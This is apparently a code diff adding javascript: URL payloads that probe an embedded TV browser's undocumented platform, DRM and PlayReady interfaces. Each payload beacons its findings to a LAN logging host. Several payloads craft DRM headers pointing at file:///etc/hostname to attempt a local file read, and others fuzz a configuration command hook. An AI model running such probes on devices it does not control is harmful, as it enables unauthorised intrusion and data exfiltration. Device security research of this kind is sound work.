+      if (name === 'jsruntimevalues') {
+        var runtimeValues = "(function(){var r=[],x=window.opera_omi.runtimeInfo;function g(n,f){try{r.push(n+'='+String(f()))}catch(e){r.push(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}g('memoryControllerEnabled',function(){return x.memoryControllerEnabled});g('memoryLimit',function(){return x.memoryLimit});g('runtimeJSON',function(){return JSON.stringify(x)});(new Image()).src='http://192.168.0.163:8888/bridge-log?runtimeValues='+encodeURIComponent(r.join(';'))})()";
+        urls.jsruntimevalues = 'javascript:' + runtimeValues;
+      }
+      if (name === 'jsemptymessage') {
+        var emptyMessage = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?platformMessage='+encodeURIComponent(s)}var x=window.opera_omi;b('before:no-args');try{var v=x.sendPlatformMessage();b('after:returnType='+typeof v+';value='+String(v))}catch(e){b('throw:name='+(e.name||'')+';message='+(e.message||'')+';string='+String(e))}})()";
+        urls.jsemptymessage = 'javascript:' + emptyMessage;
+      }
+      if (name === 'jsemptystring') {
+        var emptyString = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?platformString='+encodeURIComponent(s)}var x=window.opera_omi;b('before:empty-string');try{var v=x.sendPlatformMessage('');b('after:returnType='+typeof v+';value='+String(v))}catch(e){b('throw:name='+(e.name||'')+';message='+(e.message||'')+';string='+String(e))}})()";
+        urls.jsemptystring = 'javascript:' + emptyString;
+      }
+      if (name === 'jslistener') {
+        var listener = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?platformListener='+encodeURIComponent(s)}var x=window.opera_omi,cb=function(){var a=[];for(var i=0;i<arguments.length;i++)a.push(typeof arguments[i]+':'+String(arguments[i]));b('callback:argc='+arguments.length+';args='+a.join('|'))};b('before:add-one-callback');try{var v=x.addPlatformEventListener(cb);b('listenerReturn:type='+typeof v+';value='+String(v));try{x.sendPlatformMessage('');b('sendAfterListener=returned')}catch(e2){b('sendAfterListener=THROW:'+(e2.message||String(e2)))}}catch(e){b('listenerThrow:name='+(e.name||'')+';message='+(e.message||'')+';string='+String(e))}})()";
+        urls.jslistener = 'javascript:' + listener;
+      }
+      if (name === 'jsemptyjson') {
+        var emptyJson = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?platformJSON='+encodeURIComponent(s)}var x=window.opera_omi,cb=function(){var a=[];for(var i=0;i<arguments.length;i++)a.push(typeof arguments[i]+':'+String(arguments[i]));b('callback:argc='+arguments.length+';args='+a.join('|'))};try{x.addPlatformEventListener(cb);b('listener=accepted')}catch(e){b('listener=THROW:'+(e.message||String(e)))}b('before:{}');try{var v=x.sendPlatformMessage('{}');b('after:type='+typeof v+';value='+String(v))}catch(e2){b('send=THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}})()";
+        urls.jsemptyjson = 'javascript:' + emptyJson;
+      }
+      if (name === 'jseventcapture') {
+        var eventCapture = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?platformEvent='+encodeURIComponent(s)+'&t='+Date.now()}var count=0,cb=function(){count++;var a=[];for(var i=0;i<arguments.length;i++){try{a.push(typeof arguments[i]+':'+String(arguments[i]))}catch(e){a.push('unprintable')}}b('event#'+count+';argc='+arguments.length+';args='+a.join('|'))};try{window.opera_omi.addPlatformEventListener(cb);b('capture-started')}catch(e){b('listener-throw:'+(e.message||String(e)))}setTimeout(function(){b('capture-finished;count='+count)},60000)})()";
+        urls.jseventcapture = 'javascript:' + eventCapture;
+      }
+      if (name === 'jsquestionjson') {
+        var questionJson = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?platformQuestion='+encodeURIComponent(s)}var x=window.opera_omi,cb=function(){var a=[];for(var i=0;i<arguments.length;i++)a.push(typeof arguments[i]+':'+String(arguments[i]));b('callback:argc='+arguments.length+';args='+a.join('|'))};try{x.addPlatformEventListener(cb);b('listener=accepted')}catch(e){b('listener=THROW:'+(e.message||String(e)))}b('before:{?}');try{var v=x.sendPlatformMessage('{?}');b('after:type='+typeof v+';value='+String(v))}catch(e2){b('send=THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}})()";
+        urls.jsquestionjson = 'javascript:' + questionJson;
+      }
+      if (name === 'jsremaining') {
+        var remaining = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?remaining='+encodeURIComponent(s)}function one(n,get){try{var o=get();if(o==null){b(n+':NULL');return}var a=[],p=o,d=0;while(p&&d<6){var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(a.indexOf(x[i])<0)a.push(x[i])}p=Object.getPrototypeOf(p);d++}b(n+':OK:'+a.sort().join(','))}catch(e){b(n+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var f=oipfObjectFactory;one('capabilities',function(){return f.createCapabilitiesObject()});one('downloadManager',function(){return f.createDownloadManagerObject()});one('downloadTrigger',function(){return f.createDownloadTriggerObject()});one('drmAgent',function(){return f.createDrmAgentObject()});one('gatewayInfo',function(){return f.createGatewayInfoObject()});one('parentalControl',function(){return f.createParentalControlManagerObject()});one('recordingScheduler',function(){return f.createRecordingSchedulerObject()});one('searchManager',function(){return f.createSearchManagerObject()});one('videoBroadcast',function(){return f.createVideoBroadcastObject()});one('videoMpeg',function(){return f.createVideoMpegObject()})})()";
+        urls.jsremaining = 'javascript:' + remaining;
+      }
+      if (name === 'jsdrmstatus') {
+        var drmStatus = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmStatus='+encodeURIComponent(s)}function one(n,get){try{var o=get();if(o==null){b(n+':NULL');return}var a=[],p=o,d=0;while(p&&d<5){var x=Object.getOwnPropertyNames(p);for(var i=0;i<x.length;i++){if(a.indexOf(x[i])<0)a.push(x[i])}p=Object.getPrototypeOf(p);d++}b(n+':type='+typeof o+';string='+String(o)+';props='+a.sort().join(','));try{if(typeof o.length!=='undefined')b(n+'.length='+o.length)}catch(z){}}catch(e){b(n+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var f=oipfObjectFactory,d=f.createDrmAgentObject(),r=f.createRecordingSchedulerObject();one('DRMSystemStatus',function(){return d.DRMSystemStatus});one('discInfo',function(){return r.discInfo});one('recordings',function(){return r.recordings});one('scheduledRecordings',function(){return r.getScheduledRecordings()})})()";
+        urls.jsdrmstatus = 'javascript:' + drmStatus;
+      }
+      if (name === 'jsdrmprototype') {
+        var drmPrototype = "(function(){var r=[];function g(n,f){try{var v=f();r.push(n+'='+String(v))}catch(e){r.push(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var f=oipfObjectFactory,d=f.createDrmAgentObject(),q=f.createRecordingSchedulerObject(),p=d.DRMSystemStatus&&d.DRMSystemStatus.prototype;g('DRMSystemStatus.prototype.props',function(){return Object.getOwnPropertyNames(p).sort().join(',')});g('DRMSystemStatus.construct',function(){return new d.DRMSystemStatus()});g('disc.total',function(){return q.discInfo.total});g('disc.free',function(){return q.discInfo.free});g('disc.reserved',function(){return q.discInfo.reserved});g('sendDRMMessage.type',function(){return typeof d.sendDRMMessage});g('sendDRMMessage.arity',function(){return d.sendDRMMessage.length});(new Image()).src='http://192.168.0.163:8888/bridge-log?drmPrototype='+encodeURIComponent(r.join(';'))})()";
+        urls.jsdrmprototype = 'javascript:' + drmPrototype;
+      }
+      if (name === 'jsdrmempty') {
+        var drmEmpty = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmEmpty='+encodeURIComponent(s)}var d=oipfObjectFactory.createDrmAgentObject();b('before:no-args');try{var v=d.sendDRMMessage();b('after:type='+typeof v+';value='+String(v))}catch(e){b('throw:name='+(e.name||'')+';message='+(e.message||'')+';string='+String(e))}})()";
+        urls.jsdrmempty = 'javascript:' + drmEmpty;
+      }
+      if (name === 'jsdrmarity') {
+        var drmArity = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmArity='+encodeURIComponent(s)}var d=oipfObjectFactory.createDrmAgentObject();function t(n,f){b('before:'+n);try{var v=f();b(n+':return:type='+typeof v+';value='+String(v))}catch(e){b(n+':throw:'+(e.name||'')+':'+(e.message||String(e)))}}t('one-empty',function(){return d.sendDRMMessage('')});t('two-empty',function(){return d.sendDRMMessage('','')});t('three-empty',function(){return d.sendDRMMessage('','','')})})()";
+        urls.jsdrmarity = 'javascript:' + drmArity;
+      }
+      if (name === 'jsdrmresponse') {
+        var drmResponse = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmResponse='+encodeURIComponent(s)+'&t='+Date.now()}function cb(){var a=[];for(var i=0;i<arguments.length;i++){try{var v=arguments[i],p=[];if(v&&typeof v==='object'){var n=Object.getOwnPropertyNames(v);for(var j=0;j<n.length;j++){try{p.push(n[j]+'='+String(v[n[j]]))}catch(z){}}}a.push(typeof v+':'+String(v)+(p.length?'['+p.join(',')+']':''))}catch(e){a.push('unprintable')}}b('callback:argc='+arguments.length+';args='+a.join('|'))}var d=oipfObjectFactory.createDrmAgentObject();d.onDRMMessageResult=cb;try{d.addEventListener('DRMMessageResult',cb);b('listener=accepted')}catch(e){b('listener=THROW:'+(e.message||String(e)))}try{var id=d.sendDRMMessage('','','');b('sent:id='+String(id))}catch(e2){b('send=THROW:'+(e2.message||String(e2)))}setTimeout(function(){b('capture-finished')},15000)})()";
+        urls.jsdrmresponse = 'javascript:' + drmResponse;
+      }
+      if (name === 'jsdrmcapabilities') {
+        var drmCapabilities = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmCapabilities='+encodeURIComponent(s)}try{var x=oipfObjectFactory.createCapabilitiesObject().xmlCapabilities,n=x.getElementsByTagName('drm'),a=[];for(var i=0;i<n.length;i++){a.push('drm['+i+'].id='+n[i].getAttribute('DRMSystemID')+';text='+n[i].textContent+';xml='+(n[i].outerHTML||''))}if(!a.length){var all=x.getElementsByTagName('*');for(var j=0;j<all.length;j++){var id=all[j].getAttribute&&all[j].getAttribute('DRMSystemID');if(id)a.push(all[j].nodeName+'='+id+';text='+all[j].textContent)}}b('count='+a.length+';'+a.join('|'))}catch(e){b('THROW:'+(e.name||'')+':'+(e.message||String(e)))}})()";
+        urls.jsdrmcapabilities = 'javascript:' + drmCapabilities;
+      }
+      if (name === 'jsdrmuuid') {
+        var drmUuid = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmUUID='+encodeURIComponent(s)+'&t='+Date.now()}var d=oipfObjectFactory.createDrmAgentObject(),ids=['urn:uuid:9a04f079-9840-4286-ab92-e65be0885f95','urn:uuid:5e629af5-38da-4063-8977-97ffbd9902d4'];d.onDRMMessageResult=function(id,msg,code){b('callback:id='+id+';code='+code+';msg='+msg)};for(var i=0;i<ids.length;i++){try{var n=d.sendDRMMessage('','',ids[i]);b('sent:system='+ids[i]+';id='+n)}catch(e){b('throw:system='+ids[i]+';name='+(e.name||'')+';message='+(e.message||String(e)))}}setTimeout(function(){b('capture-finished')},15000)})()";
+        urls.jsdrmuuid = 'javascript:' + drmUuid;
+      }
+      if (name === 'jsdrmdvb') {
+        var drmDvb = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?drmDVB='+encodeURIComponent(s)+'&t='+Date.now()}var d=oipfObjectFactory.createDrmAgentObject(),ids=['urn:dvb:casystemid:19219','urn:dvb:casystemid:19188'];d.onDRMMessageResult=function(id,msg,code){b('callback:id='+id+';code='+code+';msg='+msg)};for(var i=0;i<ids.length;i++){try{var n=d.sendDRMMessage('','',ids[i]);b('sent:system='+ids[i]+';id='+n)}catch(e){b('throw:system='+ids[i]+';name='+(e.name||'')+';message='+(e.message||String(e)))}}setTimeout(function(){b('capture-finished')},15000)})()";
+        urls.jsdrmdvb = 'javascript:' + drmDvb;
+      }
+      if (name === 'jseme') {
+        var eme = "(function(){var r=[];function g(n,f){try{r.push(n+'='+String(f()))}catch(e){r.push(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}var v=document.createElement('video'),p=HTMLMediaElement.prototype;g('navigator.requestMediaKeySystemAccess',function(){return typeof navigator.requestMediaKeySystemAccess});g('window.MediaKeys',function(){return typeof window.MediaKeys});g('window.WebKitMediaKeys',function(){return typeof window.WebKitMediaKeys});g('video.setMediaKeys',function(){return typeof v.setMediaKeys});g('video.webkitSetMediaKeys',function(){return typeof v.webkitSetMediaKeys});g('video.webkitGenerateKeyRequest',function(){return typeof v.webkitGenerateKeyRequest});g('video.generateKeyRequest',function(){return typeof v.generateKeyRequest});g('video.webkitAddKey',function(){return typeof v.webkitAddKey});g('MediaKeySystemAccess',function(){return typeof window.MediaKeySystemAccess});(new Image()).src='http://192.168.0.163:8888/bridge-log?eme='+encodeURIComponent(r.join(';'))})()";
+        urls.jseme = 'javascript:' + eme;
+      }
+      if (name === 'jsemesupport') {
+        var emeSupport = "(function(){var r=[],v=document.createElement('video'),ks=['com.microsoft.playready','com.widevine.alpha','com.marlin.drm.actiontoken'];function g(n,f){try{r.push(n+'='+String(f()))}catch(e){r.push(n+'=THROW:'+(e.name||'')+':'+(e.message||String(e)))}}for(var i=0;i<ks.length;i++){(function(k){g(k+'.mp4',function(){return v.canPlayType('video/mp4',k)});g(k+'.cenc',function(){return v.canPlayType('video/mp4; codecs=\"avc1.42E01E\"',k)})})(ks[i])}g('generateKeyRequest.arity',function(){return v.webkitGenerateKeyRequest.length});g('addKey.arity',function(){return v.webkitAddKey.length});(new Image()).src='http://192.168.0.163:8888/bridge-log?emeSupport='+encodeURIComponent(r.join(';'))})()";
+        urls.jsemesupport = 'javascript:' + emeSupport;
+      }
+      if (name === 'jsplayreadyempty') {
+        var playreadyEmpty = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyEmpty='+encodeURIComponent(s)+'&t='+Date.now()}var v=document.createElement('video');function ev(e){var a=['type='+e.type];try{a.push('keySystem='+e.keySystem)}catch(z){}try{a.push('sessionId='+e.sessionId)}catch(z2){}try{a.push('errorCode='+e.errorCode)}catch(z3){}try{a.push('systemCode='+e.systemCode)}catch(z4){}try{a.push('messageLength='+(e.message&&e.message.byteLength))}catch(z5){}b('event:'+a.join(';'))}v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('webkitneedkey',ev);b('before:generate');try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready');b('after:type='+typeof r+';value='+String(r))}catch(e){b('throw:'+(e.name||'')+':'+(e.message||String(e)))}setTimeout(function(){b('capture-finished')},15000)})()";
+        urls.jsplayreadyempty = 'javascript:' + playreadyEmpty;
+      }
+      if (name === 'jsplayreadyloaded') {
+        var playreadyLoaded = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyLoaded='+encodeURIComponent(s)+'&t='+Date.now()}var v=document.createElement('video'),done=false;function ev(e){var a=['type='+e.type];try{a.push('sessionId='+e.sessionId)}catch(z){}try{a.push('errorCode='+e.errorCode)}catch(z2){}try{a.push('systemCode='+e.systemCode)}catch(z3){}try{a.push('messageLength='+(e.message&&e.message.byteLength))}catch(z4){}b('event:'+a.join(';'))}v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('webkitneedkey',ev);v.addEventListener('loadedmetadata',function(){if(done)return;done=true;b('loadedmetadata:duration='+v.duration);try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready');b('generate:return='+typeof r+':'+String(r))}catch(e){b('generate:throw:'+(e.name||'')+':'+(e.message||String(e)))}});v.addEventListener('error',function(){b('mediaError='+(v.error&&v.error.code))});v.src='http://192.168.0.163:8888/test.mp4';v.load();b('load-started');setTimeout(function(){b('capture-finished;readyState='+v.readyState)},20000)})()";
+        urls.jsplayreadyloaded = 'javascript:' + playreadyLoaded;
+      }
+      if (name === 'jsplayreadyzero') {
+        var playreadyZero = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyZero='+encodeURIComponent(s)+'&t='+Date.now()}var v=document.createElement('video'),done=false;function ev(e){var a=['type='+e.type];try{var q=e.errorCode,n=Object.getOwnPropertyNames(q),p=[];for(var i=0;i<n.length;i++){try{p.push(n[i]+'='+String(q[n[i]]))}catch(z){}}a.push('error='+String(q)+'['+p.join(',')+']')}catch(z2){}try{a.push('systemCode='+e.systemCode)}catch(z3){}try{a.push('sessionId='+e.sessionId)}catch(z4){}b('event:'+a.join(';'))}v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('webkitneedkey',ev);v.addEventListener('loadedmetadata',function(){if(done)return;done=true;b('loadedmetadata');try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready',new Uint8Array(0));b('generate:return='+typeof r+':'+String(r))}catch(e){b('generate:throw:'+(e.name||'')+':'+(e.message||String(e)))}});v.src='http://192.168.0.163:8888/test.mp4';v.load();b('load-started');setTimeout(function(){b('capture-finished')},15000)})()";
+        urls.jsplayreadyzero = 'javascript:' + playreadyZero;
+      }
+      if (name === 'jsplayreadypssh') {
+        var playreadyPssh = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyPSSH='+encodeURIComponent(s)+'&t='+Date.now()}var v=document.createElement('video'),done=false,bytes=[0,0,0,32,112,115,115,104,0,0,0,0,154,4,240,121,152,64,66,134,171,146,230,91,224,136,95,149,0,0,0,0];function ev(e){var a=['type='+e.type];try{a.push('sessionId='+e.sessionId)}catch(z){}try{a.push('systemCode='+e.systemCode)}catch(z2){}try{a.push('messageLength='+(e.message&&e.message.byteLength))}catch(z3){}try{a.push('defaultURL='+e.defaultURL)}catch(z4){}b('event:'+a.join(';'))}v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('webkitneedkey',ev);v.addEventListener('loadedmetadata',function(){if(done)return;done=true;b('loadedmetadata');try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready',new Uint8Array(bytes));b('generate:return='+typeof r+':'+String(r))}catch(e){b('generate:throw:'+(e.name||'')+':'+(e.message||String(e)))}});v.src='http://192.168.0.163:8888/test.mp4';v.load();b('load-started;psshLength='+bytes.length);setTimeout(function(){b('capture-finished')},20000)})()";
+        urls.jsplayreadypssh = 'javascript:' + playreadyPssh;
+      }
+      if (name === 'jsplayreadyfile') {
+        var playreadyFile = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyFile='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}function le16(a,n){a.push(n&255,(n>>>8)&255)}function le32(a,n){a.push(n&255,(n>>>8)&255,(n>>>16)&255,(n>>>24)&255)}function be32(a,n){a.push((n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255)}var xml='<WRMHEADER xmlns=\"http://schemas.microsoft.com/DRM/2007/03/PlayReadyHeader\" version=\"4.0.0.0\"><DATA><PROTECTINFO><ALGID>AESCTR</ALGID><KEYLEN>16</KEYLEN></PROTECTINFO><KID>AAAAAAAAAAAAAAAAAAAAAA==</KID><LA_URL>file:///etc/hostname</LA_URL></DATA></WRMHEADER>',u=[];for(var i=0;i<xml.length;i++)le16(u,xml.charCodeAt(i));var pro=[];le32(pro,4+2+2+2+u.length);le16(pro,1);le16(pro,1);le16(pro,u.length);pro=pro.concat(u);var p=[];be32(p,32+pro.length);p.push(112,115,115,104,0,0,0,0,154,4,240,121,152,64,66,134,171,146,230,91,224,136,95,149);be32(p,pro.length);p=p.concat(pro);var v=document.createElement('video'),done=false;function ev(e){var a=['type='+e.type];try{a.push('sessionId='+e.sessionId)}catch(z){}try{a.push('systemCode='+e.systemCode)}catch(z2){}try{var m=new Uint8Array(e.message||new ArrayBuffer(0)),asc='',uni='';for(var j=0;j<m.length&&j<4096;j++){asc+=m[j]>=32&&m[j]<127?String.fromCharCode(m[j]):'.'}for(var k=0;k+1<m.length&&k<8192;k+=2){var c=m[k]|(m[k+1]<<8);uni+=c>=32&&c<127?String.fromCharCode(c):'.'}a.push('messageLength='+m.length);a.push('ascii='+asc);a.push('utf16='+uni)}catch(z3){a.push('decodeError='+z3)}b('event:'+a.join(';'))}v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('webkitneedkey',ev);v.addEventListener('loadedmetadata',function(){if(done)return;done=true;b('loadedmetadata;psshLength='+p.length+';proLength='+pro.length);try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready',new Uint8Array(p));b('generate:return='+typeof r+':'+String(r))}catch(e){b('generate:throw:'+(e.name||'')+':'+(e.message||String(e)))}});v.src='http://192.168.0.163:8888/test.mp4';v.load();b('load-started');setTimeout(function(){b('capture-finished')},20000)})()";
+        urls.jsplayreadyfile = 'javascript:' + playreadyFile;
+      }
+      if (name === 'jsplayreadychecksum') {
+        var playreadyChecksum = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyChecksum='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}function le16(a,n){a.push(n&255,(n>>>8)&255)}function le32(a,n){a.push(n&255,(n>>>8)&255,(n>>>16)&255,(n>>>24)&255)}function be32(a,n){a.push((n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255)}var xml='<WRMHEADER xmlns=\"http://schemas.microsoft.com/DRM/2007/03/PlayReadyHeader\" version=\"4.0.0.0\"><DATA><PROTECTINFO><KEYLEN>16</KEYLEN><ALGID>AESCTR</ALGID></PROTECTINFO><KID>AAAAAAAAAAAAAAAAAAAAAA==</KID><CHECKSUM>ZulL1O+KLDs=</CHECKSUM><LA_URL>file:///etc/hostname</LA_URL></DATA></WRMHEADER>',u=[];for(var i=0;i<xml.length;i++)le16(u,xml.charCodeAt(i));var pro=[];le32(pro,10+u.length);le16(pro,1);le16(pro,1);le16(pro,u.length);pro=pro.concat(u);var p=[];be32(p,32+pro.length);p.push(112,115,115,104,0,0,0,0,154,4,240,121,152,64,66,134,171,146,230,91,224,136,95,149);be32(p,pro.length);p=p.concat(pro);var v=document.createElement('video'),done=false;function ev(e){var a=['type='+e.type];try{a.push('sessionId='+e.sessionId)}catch(z){}try{a.push('systemCode='+e.systemCode)}catch(z2){}try{a.push('defaultURL='+e.defaultURL)}catch(z3){}try{var m=new Uint8Array(e.message||new ArrayBuffer(0)),asc='',uni='';for(var j=0;j<m.length&&j<4096;j++)asc+=m[j]>=32&&m[j]<127?String.fromCharCode(m[j]):'.';for(var k=0;k+1<m.length&&k<8192;k+=2){var c=m[k]|(m[k+1]<<8);uni+=c>=32&&c<127?String.fromCharCode(c):'.'}a.push('messageLength='+m.length);a.push('ascii='+asc);a.push('utf16='+uni)}catch(z4){a.push('decodeError='+z4)}b('event:'+a.join(';'))}v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('webkitneedkey',ev);v.addEventListener('loadedmetadata',function(){if(done)return;done=true;b('loadedmetadata;psshLength='+p.length);try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready',new Uint8Array(p));b('generate:return='+typeof r+':'+String(r))}catch(e){b('generate:throw:'+(e.name||'')+':'+(e.message||String(e)))}});v.src='http://192.168.0.163:8888/test.mp4';v.load();b('load-started');setTimeout(function(){b('capture-finished')},20000)})()";
+        urls.jsplayreadychecksum = 'javascript:' + playreadyChecksum;
+      }
+      if (name === 'jscenc') {
+        var cenc = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?cenc='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}function bytes(x){try{var q=new Uint8Array(x||new ArrayBuffer(0)),h='',a='';for(var i=0;i<q.length&&i<512;i++){h+=('0'+q[i].toString(16)).slice(-2);a+=q[i]>=32&&q[i]<127?String.fromCharCode(q[i]):'.'}return 'len='+q.length+';hex='+h+';ascii='+a}catch(e){return 'decodeThrow='+e}}var v=document.createElement('video'),requested=false;function ev(e){var s='type='+e.type;try{s+=';keySystem='+e.keySystem}catch(z){}try{s+=';sessionId='+e.sessionId}catch(z2){}try{s+=';systemCode='+e.systemCode}catch(z3){}try{s+=';errorCode='+e.errorCode}catch(z4){}try{s+=';initData='+bytes(e.initData)}catch(z5){}try{s+=';message='+bytes(e.message)}catch(z6){}b(s);if(e.type==='webkitneedkey'&&!requested){requested=true;try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready',e.initData);b('generate:return='+typeof r+':'+String(r))}catch(x){b('generate:throw:'+(x.name||'')+':'+(x.message||String(x)))}}}v.addEventListener('webkitneedkey',ev);v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('loadedmetadata',function(){b('loadedmetadata;duration='+v.duration+';readyState='+v.readyState)});v.addEventListener('error',function(){b('mediaError='+(v.error&&v.error.code)+';readyState='+v.readyState)});v.src='http://192.168.0.163:8888/encrypted-test.mp4';v.load();b('load-started');setTimeout(function(){b('capture-finished;readyState='+v.readyState+';networkState='+v.networkState)},30000)})()";
+        urls.jscenc = 'javascript:' + cenc;
+      }
+      if (name === 'jsplayreadycenc') {
+        var playreadyCenc = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?playreadyCenc='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}function dump(x){try{var q=new Uint8Array(x||new ArrayBuffer(0)),h='';for(var i=0;i<q.length&&i<768;i++)h+=('0'+q[i].toString(16)).slice(-2);return 'len='+q.length+';hex='+h}catch(e){return 'decodeThrow='+e}}var v=document.createElement('video'),requested=false;function ev(e){var s='type='+e.type;try{s+=';keySystem='+e.keySystem}catch(z){}try{s+=';sessionId='+e.sessionId}catch(z2){}try{s+=';systemCode='+e.systemCode}catch(z3){}try{s+=';errorCode='+e.errorCode}catch(z4){}try{s+=';initData='+dump(e.initData)}catch(z5){}try{s+=';message='+dump(e.message)}catch(z6){}b(s);if(e.type==='webkitneedkey'&&!requested){requested=true;try{var r=v.webkitGenerateKeyRequest('com.microsoft.playready',e.initData);b('generate:return='+typeof r+':'+String(r))}catch(x){b('generate:throw:'+(x.name||'')+':'+(x.message||String(x)))}}}v.addEventListener('webkitneedkey',ev);v.addEventListener('webkitkeymessage',ev);v.addEventListener('webkitkeyerror',ev);v.addEventListener('loadedmetadata',function(){b('loadedmetadata;duration='+v.duration+';readyState='+v.readyState)});v.addEventListener('error',function(){b('mediaError='+(v.error&&v.error.code)+';readyState='+v.readyState)});v.src='http://192.168.0.163:8888/playready-encrypted-test.mp4';v.load();b('load-started');setTimeout(function(){b('capture-finished;readyState='+v.readyState+';networkState='+v.networkState)},30000)})()";
+        urls.jsplayreadycenc = 'javascript:' + playreadyCenc;
+      }
+      if (name === 'jsomitypes') {
+        var omiTypes = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?omiTypes='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var x=window.opera_omi,f=x.sendPlatformMessage,l=x.addPlatformEventListener;function desc(n,o,k){try{var d=Object.getOwnPropertyDescriptor(o,k);b(n+'='+(d?('valueType='+typeof d.value+';writable='+d.writable+';enumerable='+d.enumerable+';configurable='+d.configurable):'none'))}catch(e){b(n+'=THROW:'+(e.message||String(e)))}}b('send.length='+f.length+';send.string='+String(f)+';listener.length='+l.length+';listener.string='+String(l));desc('omi.send.own',x,'sendPlatformMessage');desc('omi.listener.own',x,'addPlatformEventListener');try{desc('proto.send',Object.getPrototypeOf(x),'sendPlatformMessage')}catch(z){}var vals=[null,true,false,0,1,{},[],function(){}],names=['null','true','false','zero','one','object','array','function'];for(var i=0;i<vals.length;i++){try{var r=f.call(x,vals[i]);b(names[i]+':returnType='+typeof r+';value='+String(r))}catch(e){b(names[i]+':THROW:'+(e.name||'')+':'+(e.message||String(e)))}}})()";
+        urls.jsomitypes = 'javascript:' + omiTypes;
+      }
+      if (name === 'jsomischemas') {
+        var omiSchemas = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?omiSchemas='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var x=window.opera_omi,count=0;function cb(){count++;var a=[];for(var i=0;i<arguments.length;i++){try{var v=arguments[i];a.push(typeof v+':'+String(v))}catch(e){a.push('unprintable')}}b('event#'+count+';argc='+arguments.length+';args='+a.join('|'))}try{x.addPlatformEventListener(cb);b('listener=accepted')}catch(e){b('listener=THROW:'+(e.message||String(e)))}var m=['ping','version','getVersion','{\"type\":\"ping\"}','{\"type\":\"getVersion\"}','{\"command\":\"getVersion\"}','{\"method\":\"getVersion\"}','{\"event\":\"ping\"}','[\"getVersion\"]','<message type=\"ping\"/>'];for(var i=0;i<m.length;i++){try{var r=x.sendPlatformMessage(m[i]);b('case'+i+';input='+m[i]+';returnType='+typeof r+';value='+String(r))}catch(e2){b('case'+i+';input='+m[i]+';THROW:'+(e2.name||'')+':'+(e2.message||String(e2)))}}setTimeout(function(){b('capture-finished;events='+count)},20000)})()";
+        urls.jsomischemas = 'javascript:' + omiSchemas;
+      }
+      if (name === 'jsconfigextra') {
+        var configExtra = "(function(){function b(s){(new Image()).src='http://192.168.0.163:8888/bridge-log?configExtra='+encodeURIComponent(s).substring(0,1800)+'&t='+Date.now()}var c=oipfObjectFactory.createConfigurationObject().configuration,f=c.scExtraCmd;b('type='+typeof f+';length='+f.length+';string='+String(f));var tests=[[],[''],['help'],['?'],['version'],['getVersion'],['list'],['getProperties'],['getProperty'],['systemInfo']];for(var i=0;i<tests.length;i++){try{var r=f.apply(c,tests[i]),s='';try{s=JSON.stringify(r)}catch(z){s=String(r)}b('case'+i+';args='+tests[i].join('|')+';returnType='+typeof r+';value='+String(r)+';json='+s)}catch(e){b('case'+i+';args='+tests[i].join('|')+';THROW:'+(e.name||'')+':'+(e.message||String(e)))}}})()";
+        urls.jsconfigextra = 'javascript:' + configExtra;
+      }
